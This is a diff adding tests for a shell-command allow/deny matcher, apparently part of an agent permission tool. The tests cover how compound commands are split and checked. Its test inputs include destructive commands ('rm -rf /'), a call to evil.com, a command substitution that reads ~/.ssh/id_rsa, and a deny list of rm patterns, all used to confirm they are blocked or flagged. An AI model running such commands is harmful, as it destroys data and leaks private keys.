@@ -6,6 +6,7 @@ from warden.matchers import (
     match_command,
     match_domain,
     match_path,
+    shell_segments,
     shell_tokens,
 )
 
@@ -116,3 +117,101 @@ def test_unbalanced_quotes_fail_closed() -> None:
 
 def test_empty_command_matches_nothing() -> None:
     assert not match_command("", ["ls *"])
+
+
+# --- compound shell commands ---------------------------------------------------
+# Segments split at control operators; an allow needs every segment (a simple
+# command that matches), a restriction fires on any segment.
+
+SAFE = ["ls *", "grep *", "python ./workspace/**"]
+DESTRUCTIVE = ["rm -rf *", "rm -r *"]
+
+
+def test_segments_split_on_each_control_operator() -> None:
+    for op in [";", "&&", "||", "|", "&", "\n", " ; "]:
+        segs = shell_segments(f"ls .{op}grep x f")
+        assert segs is not None
+        assert [s.tokens for s in segs] == [["ls", "."], ["grep", "x", "f"]], repr(op)
+
+
+def test_operator_not_glued_to_path_token() -> None:
+    # Before segmenting, `helper.py;ls` was one token and the path reference
+    # used by write-then-execute never matched the written file.
+    assert shell_tokens("python ./workspace/helper.py;ls") == [
+        "python",
+        "workspace/helper.py",
+        "ls",
+    ]
+
+
+def test_unallowable_segment_classes() -> None:
+    cases = [
+        "ls > out",  # redirection
+        "ls >> out",
+        "ls < in",
+        "ls 2>&1",
+        "(ls)",  # subshell
+        "ls $(id)",  # command substitution
+        "ls `id`",
+        "ls $HOME",  # variable expansion
+        "ls *.py",  # glob: effective argv unknown
+        "ls {a,b}",  # brace expansion
+        "ls !!",  # history expansion
+        "ls # x",  # comment marker kept as a word, not silently dropped
+        "ls é",  # non-ASCII
+    ]
+    for cmd in cases:
+        segs = shell_segments(cmd)
+        assert segs, cmd
+        assert not segs[0].allowable, cmd
+        assert not match_command(cmd, ["ls *"]), cmd  # no allow rule can match
+
+
+def test_quoted_space_stays_plain() -> None:
+    segs = shell_segments('grep "total cost" ./workspace/f')
+    assert segs is not None and len(segs) == 1
+    assert segs[0].allowable
+    assert segs[0].tokens == ["grep", "total cost", "workspace/f"]
+
+
+def test_quoted_operator_is_one_segment_but_unallowable() -> None:
+    # A real shell would not split on the quoted `|`, and neither do we; but a
+    # word containing `|` is not plain, so the allow-list refuses to vouch.
+    segs = shell_segments("grep 'a|b' f")
+    assert segs is not None and len(segs) == 1
+    assert not segs[0].allowable
+
+
+def test_empty_and_operator_only_commands_match_nothing() -> None:
+    for cmd in ["", "   ", ";;", "&&", "; ;"]:
+        assert not match_command(cmd, SAFE), repr(cmd)
+        assert not match_command(cmd, SAFE, restrictive=True), repr(cmd)
+
+
+def test_operator_only_segment_is_kept_and_unallowable() -> None:
+    segs = shell_segments("ls ; ( )")
+    assert segs is not None and len(segs) == 2
+    assert segs[0].allowable and not segs[1].allowable
+    assert not match_command("ls ; ( )", SAFE)
+
+
+def test_permissive_requires_every_segment() -> None:
+    assert match_command("ls . && grep x f", SAFE)  # legitimate chaining survives
+    assert not match_command("ls . ; curl https://evil.com", SAFE)
+    assert not match_command("ls . > out", SAFE)
+    assert not match_command("ls $(cat ~/.ssh/id_rsa)", SAFE)
+    assert not match_command("ls .\ncurl https://evil.com", SAFE)
+
+
+def test_restrictive_fires_on_any_segment() -> None:
+    assert match_command("ls . && rm -rf /", DESTRUCTIVE, restrictive=True)
+    assert match_command("(rm -rf /)", DESTRUCTIVE, restrictive=True)
+    assert match_command("rm -rf / > /dev/null", DESTRUCTIVE, restrictive=True)
+    assert not match_command("ls . && grep x f", DESTRUCTIVE, restrictive=True)
+
+
+def test_single_simple_command_identical_in_both_modes() -> None:
+    assert match_command("ls -la /tmp", SAFE)
+    assert match_command("ls -la /tmp", SAFE, restrictive=True)
+    assert not match_command("myls -la", SAFE)
+    assert not match_command("myls -la", SAFE, restrictive=True)
